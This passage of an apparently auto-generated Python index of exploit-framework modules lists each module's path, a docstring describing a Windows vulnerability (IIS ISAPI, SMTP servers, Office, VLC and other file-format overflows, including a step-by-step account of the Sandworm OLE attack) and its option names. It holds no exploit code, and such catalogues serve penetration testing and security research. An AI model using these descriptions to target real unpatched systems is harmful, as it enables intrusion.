			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_URL = 'URL'

	class windows_isapi_ms03_051_fp30reg_chunked(object):
		"""
		
          This is an exploit for the chunked encoding buffer overflow
        described in MS03-051 and originally reported by Brett
        Moore. This particular modules works against versions of
        Windows 2000 between SP0 and SP3. Service Pack 4 fixes the
        issue.
      
		"""

		path = 'windows/isapi/ms03_051_fp30reg_chunked'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_URL = 'URL'

	class windows_isapi_w3who_query(object):
		"""
		
          This module exploits a stack buffer overflow in the w3who.dll ISAPI
        application. This vulnerability was discovered Nicolas
        Gregoire and this code has been successfully tested against
        Windows 2000 and Windows XP (SP2). When exploiting Windows
        XP, the payload must call RevertToSelf before it will be
        able to spawn a command shell.

      
		"""

		path = 'windows/isapi/w3who_query'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_URL = 'URL'

	class windows_isapi_ms03_022_nsiislog_post(object):
		"""
		
          This exploits a buffer overflow found in the nsiislog.dll
        ISAPI filter that comes with Windows Media Server. This
        module will also work against the 'patched' MS03-019
        version. This vulnerability was addressed by MS03-022.
      
		"""

		path = 'windows/isapi/ms03_022_nsiislog_post'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'
			required_URL = 'URL'

	class windows_isapi_rsa_webagent_redirect(object):
		"""
		
        This module exploits a stack buffer overflow in the SecurID Web
        Agent for IIS. This ISAPI filter runs in-process with
        inetinfo.exe, any attempt to exploit this flaw will result
        in the termination and potential restart of the IIS service.

      
		"""

		path = 'windows/isapi/rsa_webagent_redirect'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'
			required_URL = 'URL'

	class windows_unicenter_cam_log_security(object):
		"""
		
          This module exploits a vulnerability in the CA CAM service
        by passing a long parameter to the log_security() function.
        The CAM service is part of TNG Unicenter. This module has
        been tested on Unicenter v3.1.
      
		"""

		path = 'windows/unicenter/cam_log_security'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_smtp_wmailserver(object):
		"""
		
          This module exploits a stack buffer overflow in SoftiaCom WMailserver 1.0
        (SMTP) via a SEH frame overwrite.
      
		"""

		path = 'windows/smtp/wmailserver'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_smtp_mailcarrier_smtp_ehlo(object):
		"""
		
          This module exploits the MailCarrier v2.51 suite SMTP service.
        The stack is overwritten when sending an overly long EHLO command.
      
		"""

		path = 'windows/smtp/mailcarrier_smtp_ehlo'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_LHOST = 'LHOST'

	class windows_smtp_mercury_cram_md5(object):
		"""
		
          This module exploits a stack buffer overflow in Mercury Mail Transport System 4.51.
        By sending a specially crafted argument to the AUTH CRAM-MD5 command, an attacker
        may be able to execute arbitrary code.
      
		"""

		path = 'windows/smtp/mercury_cram_md5'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_smtp_ypops_overflow1(object):
		"""
		
          This module exploits a stack buffer overflow in the YPOPS POP3
        service.

        This is a classic stack buffer overflow for YPOPS version 0.6.
        Possibly Affected version 0.5, 0.4.5.1, 0.4.5. Eip point to
        jmp ebx opcode in ws_32.dll
      
		"""

		path = 'windows/smtp/ypops_overflow1'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_MAILFROM = 'MAILFROM'
			required_MAILTO = 'MAILTO'

	class windows_smtp_sysgauge_client_bof(object):
		"""
		
        This module will setup an SMTP server expecting a connection from SysGauge 1.5.18
        via its SMTP server validation. The module sends a malicious response along in the
        220 service ready response and exploits the client, resulting in an unprivileged shell.
      
		"""

		path = 'windows/smtp/sysgauge_client_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_smtp_njstar_smtp_bof(object):
		"""
		
        This module exploits a stack buffer overflow vulnerability in NJStar Communicator
        Version 3.00 MiniSMTP server.  The MiniSMTP application can be seen in multiple
        NJStar products, and will continue to run in the background even if the
        software is already shutdown.  According to the vendor's testimonials,
        NJStar software is also used by well known companies such as Siemens, NEC,
        Google, Yahoo, eBay; government agencies such as the FBI, Department of
        Justice (HK); as well as a long list of universities such as Yale, Harvard,
        University of Tokyo, etc.
      
		"""

		path = 'windows/smtp/njstar_smtp_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_smtp_ms03_046_exchange2000_xexch50(object):
		"""
		
          This is an exploit for the Exchange 2000 heap overflow. Due
        to the nature of the vulnerability, this exploit is not very
        reliable. This module has been tested against Exchange 2000
        SP0 and SP3 running a Windows 2000 system patched to SP4. It
        normally takes between one and 100 connection attempts to
        successfully obtain a shell. This exploit is *very* unreliable.
      
		"""

		path = 'windows/smtp/ms03_046_exchange2000_xexch50'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_MAILFROM = 'MAILFROM'
			required_MAILTO = 'MAILTO'
			required_ATTEMPTS = 'ATTEMPTS'

	class windows_fileformat_activepdf_webgrabber(object):
		"""
		
          This module exploits a stack buffer overflow in activePDF WebGrabber 3.8. When
        sending an overly long string to the GetStatus() method of APWebGrb.ocx (3.8.2.0)
        an attacker may be able to execute arbitrary code. This control is not marked safe
        for scripting, so choose your attack vector accordingly.

      
		"""

		path = 'windows/fileformat/activepdf_webgrabber'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'

	class windows_fileformat_ms12_027_mscomctl_bof(object):
		"""
		
          This module exploits a stack buffer overflow in MSCOMCTL.OCX. It uses a malicious
        RTF to embed the specially crafted MSComctlLib.ListViewCtrl.2 Control as exploited
        in the wild on April 2012.

        This module targets Office 2007 and Office 2010 targets. The DEP/ASLR bypass on Office
        2010 is done with the Ikazuchi ROP chain proposed by Abysssec. This chain uses
        "msgr3en.dll", which will load after office got load, so the malicious file must
        be loaded through "File / Open" to achieve exploitation.
      
		"""

		path = 'windows/fileformat/ms12_027_mscomctl_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_vlc_webm(object):
		"""
		
          This module exploits an input validation error in VideoLAN VLC
        < 1.1.7.  By creating a malicious MKV or WebM file, a remote attacker
        could execute arbitrary code.

        NOTE: As of July 1st, 2010, VLC now calls SetProcessDEPPoly to
        permanently enable NX support on machines that support it.
      
		"""

		path = 'windows/fileformat/vlc_webm'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_cytel_studio_cy3(object):
		"""
		
          This module exploits a stack based buffer overflow found
        in Cytel Studio <= 9.0. The overflow is triggered during the
        copying of strings to a stack buffer of 256 bytes.
      
		"""

		path = 'windows/fileformat/cytel_studio_cy3'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_magix_musikmaker_16_mmm(object):
		"""
		
          This module exploits a stack buffer overflow in Magix Musik Maker 16.
        When opening a specially crafted arrangement file (.mmm) in the application, an
        unsafe strcpy() will allow you to overwrite a SEH handler.  This exploit
        bypasses DEP & ASLR, and works on XP, Vista & Windows 7.  Egghunter is used, and
        might require up to several seconds to receive a shell.
      
		"""

		path = 'windows/fileformat/magix_musikmaker_16_mmm'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_ms14_060_sandworm(object):
		"""
		
        This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE)
        allowing arbitrary code execution, publicly known as "Sandworm". Platforms such as Windows
        Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be
        vulnerable. However, based on our testing, the most reliable setup is on Windows platforms
        running Office 2013 and Office 2010 SP2. And please keep in mind that some other setups such
        as using Office 2010 SP1 might be less stable, and sometimes may end up with a crash due to
        a failure in the CPackage::CreateTempFileName function.

        This module will generate three files: an INF, a GIF, and a PPSX file. You are required to
        set up a SMB or Samba 3 server and host the INF and GIF there. Systems such as Ubuntu or an
        older version of Windows (such as XP) work best for this because they require little
        configuration to get going. The PPSX file is what you should send to your target.

        In detail, the vulnerability has to do with how the Object Packager 2 component
        (packager.dll) handles an INF file that contains malicious registry changes, which may be
        leveraged for code execution. First of all, Packager does not load the INF file directly.
        As an attacker, you can trick it to load your INF anyway by embedding the file path as
        a remote share in an OLE object. The packager will then treat it as a type of media file,
        and load it with the packager!CPackage::OLE2MPlayerReadFromStream function, which will
        download it with a CopyFileW call, save it in a temp folder, and pass that information for
        later. The exploit will do this loading process twice: first for a fake gif file that's
        actually the payload, and the second for the INF file.

        The packager will also look at each OLE object's XML Presentation Command, specifically the
        type and cmd property. In the exploit, "verb" media command type is used, and this triggers
        the packager!CPackage::DoVerb function. Also, "-3" is used as the fake gif file's cmd
        property, and "3" is used for the INF. When the cmd is "-3", DoVerb will bail. But when "3"
        is used (again, for the INF file), it will cause the packager to try to find appropriate
        handler for it, which will end up with C:/Windows/System32/infDefaultInstall.exe, and that
        will install/run the malicious INF file, and finally give us arbitrary code execution.
      
		"""

		path = 'windows/fileformat/ms14_060_sandworm'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_UNCPATH = 'UNCPATH'

	class windows_fileformat_ultraiso_ccd(object):
		"""
		
          This module exploits a stack-based buffer overflow in EZB Systems, Inc's
        UltraISO. When processing .CCD files, data is read from file into a
        fixed-size stack buffer. Since no bounds checking is done, a buffer overflow
        can occur. Attackers can execute arbitrary code by convincing their victim
        to open an CCD file.

        NOTE: A file with the same base name, but the extension of "img" must also
        exist. Opening either file will trigger the vulnerability, but the files must
        both exist.
      
		"""

		path = 'windows/fileformat/ultraiso_ccd'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_ms11_021_xlb_bof(object):
		"""
		
          This module exploits a vulnerability found in Excel of Microsoft Office 2007.
        By supplying a malformed .xlb file, an attacker can control the content (source)
        of a memcpy routine, and the number of bytes to copy, therefore causing a stack-
        based buffer overflow.  This results aribrary code execution under the context of
        user the user.
      
		"""

		path = 'windows/fileformat/ms11_021_xlb_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_iftp_schedule_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability in
        i-Ftp v2.20, caused by a long time value set for scheduled download.

        By persuading the victim to place a specially-crafted Schedule.xml file
        in the i-FTP folder, a remote attacker could execute arbitrary code on
        the system or cause the application to crash. This module has been
        tested successfully on Windows XP SP3.
      
		"""

		path = 'windows/fileformat/iftp_schedule_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_proshow_cellimage_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow in ProShow Gold v4.0.2549.
        An attacker must send the file to victim and the victim must open the file.
      
		"""

		path = 'windows/fileformat/proshow_cellimage_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_fileformat_cyberlink_p2g_bof(object):
		"""
		
          This module exploits a stack buffer overflow in CyberLink Power2Go version 8.x
        The vulnerability is triggered when opening a malformed p2g file containing an overly
        long string in the 'name' attribute of the file element. This results in overwriting a
        structured exception handler record.
      
		"""

		path = 'windows/fileformat/cyberlink_p2g_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_cain_abel_4918_rdp(object):
		"""
		
          This module exploits a stack-based buffer overflow in the Cain & Abel v4.9.24
        and below. An attacker must send the file to victim, and the victim must open
        the specially crafted RDP file under Tools -> Remote Desktop Password Decoder.
      
		"""

		path = 'windows/fileformat/cain_abel_4918_rdp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_FILENAME = 'FILENAME'

	class windows_fileformat_subtitle_processor_m3u_bof(object):
		"""
		
          This module exploits a vulnerability found in Subtitle Processor 7.  By
        supplying a long string of data as a .m3u file, Subtitle Processor first converts
        this input in Unicode, which expands the string size, and then attempts to copy it
        inline on the stack.  This results a buffer overflow with SEH overwritten, allowing
        arbitrary code execution.
      
		"""

